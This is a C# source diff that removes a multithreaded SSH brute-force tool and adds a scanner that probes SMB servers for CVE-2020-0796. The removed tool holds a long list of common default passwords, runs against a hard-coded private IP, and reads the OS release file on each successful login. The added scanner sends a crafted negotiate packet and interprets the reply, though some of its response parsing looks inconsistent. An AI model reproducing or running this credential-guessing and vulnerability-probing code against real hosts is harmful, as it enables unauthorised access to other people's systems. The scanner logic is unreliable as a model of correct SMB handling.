@@ -1,195 +1,181 @@
 ﻿using System;
-using System.Collections.Concurrent;
-using System.Collections.Generic;
-using System.Linq;
+using System.Net;
 using System.Net.Sockets;
 using System.Text;
-using System.Text.RegularExpressions;
-using System.Threading;
-using Tamir.SharpSsh;
 
-namespace SharpScan
+class SMBExploit
 {
-    internal class SshBrute
+    static void Main(string[] args)
     {
-        public static Dictionary<string, List<string>> UserDict = new Dictionary<string, List<string>>
+        if (args.Length < 2)
         {
-            { "ssh", new List<string> { "root", "admin", "kali" } },
-        };
+            Console.WriteLine("Usage: SMBExploit <IP> <Port>");
+            return;
+        }
 
-        public static List<string> Passwords = new List<string>
+        string ipAddress = args[0];
+        int port = int.Parse(args[1]);
+
+        byte[] header = new byte[64];
+        Array.Copy(Encoding.ASCII.GetBytes("\xfeSMB"), 0, header, 0, 4);
+        Array.Copy(BitConverter.GetBytes((ushort)64), 0, header, 4, 2);
+        Array.Copy(BitConverter.GetBytes((ushort)0), 0, header, 6, 2);
+        Array.Copy(BitConverter.GetBytes((ushort)0), 0, header, 8, 2);
+        Array.Copy(BitConverter.GetBytes((ushort)0), 0, header, 10, 2);
+        Array.Copy(BitConverter.GetBytes((ushort)31), 0, header, 12, 2);
+        Array.Copy(BitConverter.GetBytes((uint)0), 0, header, 14, 4);
+        Array.Copy(BitConverter.GetBytes((uint)0), 0, header, 18, 4);
+        Array.Copy(BitConverter.GetBytes((ulong)0), 0, header, 22, 8);
+        Array.Copy(BitConverter.GetBytes((uint)0), 0, header, 30, 4);
+        Array.Copy(BitConverter.GetBytes((uint)0), 0, header, 34, 4);
+        Array.Copy(BitConverter.GetBytes((ulong)0), 0, header, 38, 8);
+        Array.Copy(BitConverter.GetBytes((ulong)0), 0, header, 46, 8);
+        Array.Copy(BitConverter.GetBytes((ulong)0), 0, header, 54, 8);
+
+        byte[] negotiation = new byte[120];
+        Array.Copy(BitConverter.GetBytes((ushort)0x24), 0, negotiation, 0, 2);
+        Array.Copy(BitConverter.GetBytes((ushort)8), 0, negotiation, 2, 2);
+        Array.Copy(BitConverter.GetBytes((ushort)1), 0, negotiation, 4, 2);
+        Array.Copy(BitConverter.GetBytes((ushort)0), 0, negotiation, 6, 2);
+        Array.Copy(BitConverter.GetBytes((uint)0x7f), 0, negotiation, 8, 4);
+        Array.Copy(BitConverter.GetBytes((ulong)0), 0, negotiation, 12, 8);
+        Array.Copy(BitConverter.GetBytes((ulong)0), 0, negotiation, 20, 8);
+        Array.Copy(BitConverter.GetBytes((uint)0x78), 0, negotiation, 28, 4);
+        Array.Copy(BitConverter.GetBytes((ushort)2), 0, negotiation, 32, 2);
+        Array.Copy(BitConverter.GetBytes((ushort)0), 0, negotiation, 34, 2);
+
+        ushort[] dialects = { 0x0202, 0x0210, 0x0222, 0x0224, 0x0300, 0x0302, 0x0310, 0x0311 };
+        for (int i = 0; i < dialects.Length; i++)
         {
-            "123456", "admin", "admin123", "root", "", "pass123", "pass@123", "password", "123123", "654321",
-            "111111", "123", "1", "admin@123", "Admin@123", "admin123!@#", "{user}", "{user}1", "{user}111",
-            "{user}123", "{user}@123", "{user}_123", "{user}#123", "{user}@111", "{user}@2019", "{user}@123#4",
-            "P@ssw0rd!", "P@ssw0rd", "Passw0rd", "qwe123", "12345678", "test", "test123", "123qwe", "123qwe!@#",
-            "123456789", "123321", "666666", "a123456.", "123456~a", "123456!a", "000000", "1234567890", "8888888",
-            "!QAZ2wsx", "1qaz2wsx", "abc123", "abc123456", "1qaz@WSX", "a11111", "a12345", "Aa1234", "Aa1234.",
-            "Aa12345", "a123456", "a123123", "Aa123123", "Aa123456", "Aa12345.", "sysadmin", "system", "1qaz!QAZ",
-            "2wsx@WSX", "qwe123!@#", "Aa123456!", "A123456s!", "sa123456", "1q2w3e", "Charge123", "Aa123456789","a","kali"
-        };
+            Array.Copy(BitConverter.GetBytes(dialects[i]), 0, negotiation, 36 + (i * 2), 2);
+        }
 
-        private static readonly ConcurrentBag<string> SuccessfulLogins = new ConcurrentBag<string>();
-        private static readonly ConcurrentDictionary<string, bool> TriedCombinations = new ConcurrentDictionary<string, bool>();
-        private static readonly ConcurrentDictionary<string, bool> SuccessfulCombinations = new ConcurrentDictionary<string, bool>();
-        private static readonly SemaphoreSlim semaphore = new SemaphoreSlim(1, 1);
-        private static int activeThreads = 0;
-        private static readonly int maxDegreeOfParallelism = 20;
+        Array.Copy(BitConverter.GetBytes((uint)0), 0, negotiation, 52, 4);
+        Array.Copy(BitConverter.GetBytes((ushort)1), 0, negotiation, 56, 2);
+        Array.Copy(BitConverter.GetBytes((ushort)38), 0, negotiation, 58, 2);
+        Array.Copy(BitConverter.GetBytes((uint)0), 0, negotiation, 60, 4);
+        Array.Copy(BitConverter.GetBytes((ushort)1), 0, negotiation, 64, 2);
+        Array.Copy(BitConverter.GetBytes((ushort)32), 0, negotiation, 66, 2);
+        Array.Copy(BitConverter.GetBytes((ushort)1), 0, negotiation, 68, 2);
+        Array.Copy(BitConverter.GetBytes((ushort)1), 0, negotiation, 70, 2);
+        Array.Copy(BitConverter.GetBytes((ulong)0), 0, negotiation, 72, 8);
+        Array.Copy(BitConverter.GetBytes((ulong)0), 0, negotiation, 80, 8);
+        Array.Copy(BitConverter.GetBytes((ushort)3), 0, negotiation, 88, 2);
+        Array.Copy(BitConverter.GetBytes((ushort)10), 0, negotiation, 90, 2);
+        Array.Copy(BitConverter.GetBytes((uint)0), 0, negotiation, 92, 4);
+        Array.Copy(new byte[] { 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, 0, negotiation, 96, 16);
 
-        public static void Run(string host)
+        byte[] packet = new byte[header.Length + negotiation.Length];
+        Array.Copy(header, 0, packet, 0, header.Length);
+        Array.Copy(negotiation, 0, packet, header.Length, negotiation.Length);
+
+        byte[] netbios = new byte[4];
+        netbios[0] = 0;
+        netbios[1] = 0;
+        netbios[2] = (byte)((packet.Length >> 8) & 0xff);
+        netbios[3] = (byte)(packet.Length & 0xff);
+
+        byte[] fullPacket = new byte[netbios.Length + packet.Length];
+        Array.Copy(netbios, 0, fullPacket, 0, netbios.Length);
+        Array.Copy(packet, 0, fullPacket, netbios.Length, packet.Length);
+
+        Console.WriteLine($"NetBIOS ({netbios.Length}): {BitConverter.ToString(netbios).Replace("-", "")}");
+        Console.WriteLine($"Header ({header.Length}): {BitConverter.ToString(header).Replace("-", "")}");
+        Console.WriteLine($"Negotiation ({negotiation.Length}): {BitConverter.ToString(negotiation).Replace("-", "")}");
+        Console.WriteLine($"Packet ({packet.Length}): {BitConverter.ToString(packet).Replace("-", "")}");
+
+        HexDump(fullPacket);
+
+        try
         {
-            int port = 22;
-            var cts = new CancellationTokenSource();
-            var token = cts.Token;
-
-            foreach (var userPair in UserDict)
+            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
             {
-                foreach (var user in userPair.Value)
+                socket.Connect(ipAddress, port);
+                socket.Send(fullPacket);
+
+                byte[] sizeBuffer = new byte[4];
+                socket.Receive(sizeBuffer);
+                int size = BitConverter.ToInt32(sizeBuffer, 0);
+                Console.WriteLine($"Response length: {size}");
+
+                byte[] response = new byte[size];
+                int received = 0;
+                while (received < size)
                 {
-                    foreach (var pass in Passwords)
+                    int bytesRead = socket.Receive(response, received, size - received, SocketFlags.None);
+                    if (bytesRead == 0)
                     {
-                        if (token.IsCancellationRequested)
-                        {
-                            PrintResults();
-                            return;
-                        }
+                        throw new Exception("Connection closed prematurely.");
+                    }
+                    received += bytesRead;
+                }
 
-                        string comboKey = $"{host}:{port}:{user}:{pass}";
+                Console.WriteLine($"Response: {BitConverter.ToString(response).Replace("-", "")}");
 
-                        if (TriedCombinations.ContainsKey(comboKey))
-                        {
-                            continue;
-                        }
+                HexDump(response);
 
-                        TriedCombinations[comboKey] = true;
+                ushort version = BitConverter.ToUInt16(response, 68);
+                ushort context = BitConverter.ToUInt16(response, 70);
 
-                        while (true)
-                        {
-                            if (activeThreads < maxDegreeOfParallelism)
-                            {
-                                Interlocked.Increment(ref activeThreads);
-                                ThreadPool.QueueUserWorkItem(_ => TryLogin(host, port, user, pass, cts, token));
-                               // Thread.Sleep(100);
-                                break;
-                            }
-                            Thread.Sleep(100); // 等待，直到有可用的线程池线程
-                        }
+                if (version != 0x0311)
+                {
+                    Console.WriteLine($"SMB version {version:X} was found which is not vulnerable!");
+                }
+                else if (context != 2)
+                {
+                    Console.WriteLine($"Server answered with context {context:X} which indicates that the target may not have SMB compression enabled and is therefore not vulnerable!");
+                }
+                else
+                {
+                    Console.WriteLine($"SMB version {version:X} with context {context:X} was found which indicates SMBv3.1.1 is being used and SMB compression is enabled, therefore being vulnerable to CVE-2020-0796!");
+                }
+            }
+        }
+        catch (SocketException ex)
+        {
+            Console.WriteLine($"SocketException: {ex.Message}");
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Exception: {ex.Message}");
+        }
+    }
+
+    static void HexDump(byte[] data)
+    {
+        for (int i = 0; i < data.Length; i += 16)
+        {
+            Console.Write($"{i:X8}  ");
+            for (int j = 0; j < 16; j++)
+            {
+                if (i + j < data.Length)
+                {
+                    Console.Write($"{data[i + j]:X2} ");
+                }
+                else
+                {
+                    Console.Write("   ");
+                }
+            }
+
+            Console.Write(" ");
+            for (int j = 0; j < 16; j++)
+            {
+                if (i + j < data.Length)
+                {
+                    char ch = (char)data[i + j];
+                    if (char.IsControl(ch))
+                    {
+                        Console.Write(".");
+                    }
+                    else
+                    {
+                        Console.Write(ch);
                     }
                 }
             }
 
-            // 等待所有线程完成
-            while (activeThreads > 0)
-            {
-                Thread.Sleep(100);
-            }
-
-            PrintResults();
-        }
-
-        static async void TryLogin(string host, int port, string username, string password, CancellationTokenSource cts, CancellationToken token)
-        {
-            try
-            {
-                if (token.IsCancellationRequested)
-                {
-                    return;
-                }
-
-                using (var client = new TcpClient())
-                {
-                    try
-                    {
-                        var result = client.BeginConnect(host, port, null, null);
-                        bool success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(1.5));
-                        if (!success)
-                        {
-                            throw new Exception("Connection timed out");
-                        }
-
-                        client.EndConnect(result);
-                        SshExec exec = new SshExec(host, username, password);
-                        exec.Connect();
-                        string output = exec.RunCommand("cat /etc/os-release");
-                        if (output != null)
-                        {
-                            string loginInfo = $"[+] (SSH) {host}:{port}  User:{username}  Password:{password}   {ParseOsInfo(output)}";
-                            string successKey = $"{username}@{host}:{port}";
-                            //Console.WriteLine(loginInfo);
-                            await semaphore.WaitAsync();
-                            try
-                            {
-                                if (SuccessfulCombinations.TryAdd(successKey, true))
-                                {
-                                    
-                                    SuccessfulLogins.Add(loginInfo);
-                                    cts.Cancel(); // 取消所有任务
-                                }
-                            }
-                            finally
-                            {
-                                semaphore.Release();
-                            }
-                        }
-
-                        exec.Close();
-                    }
-                    catch (Exception ex)
-                    {
-                        LogException(ex);
-                    }
-                }
-            }
-            finally
-            {
-                Interlocked.Decrement(ref activeThreads);
-            }
-        }
-
-        static string ParseOsInfo(string output)
-        {
-            Dictionary<string, string> osInfo = new Dictionary<string, string>();
-            Regex regex = new Regex(@"^(\w+)=""?([^""]*)""?$", RegexOptions.Multiline);
-
-            foreach (Match match in regex.Matches(output))
-            {
-                if (match.Success)
-                {
-                    string key = match.Groups[1].Value;
-                    string value = match.Groups[2].Value;
-                    osInfo[key] = value;
-                }
-            }
-
-            if (osInfo.ContainsKey("NAME") && osInfo.ContainsKey("VERSION"))
-            {
-                return $"OS: {osInfo["NAME"]}, Version: {osInfo["VERSION"]}";
-            }
-            else
-            {
-                return "Unable to determine the operating system version.";
-            }
-        }
-
-        static void LogException(Exception ex)
-        {
-            // 这里可以将异常信息记录到日志文件中
-            // 例如：
-            // File.AppendAllText("error.log", $"{DateTime.Now}: {ex.Message}{Environment.NewLine}");
-        }
-
-        static void PrintResults()
-        {
-            foreach (var login in SuccessfulLogins)
-            {
-                Console.WriteLine(login);
-            }
-        }
-
-
-        static void Main()
-        {
-            Run("192.168.244.164");
+            Console.WriteLine();
         }
     }
 }
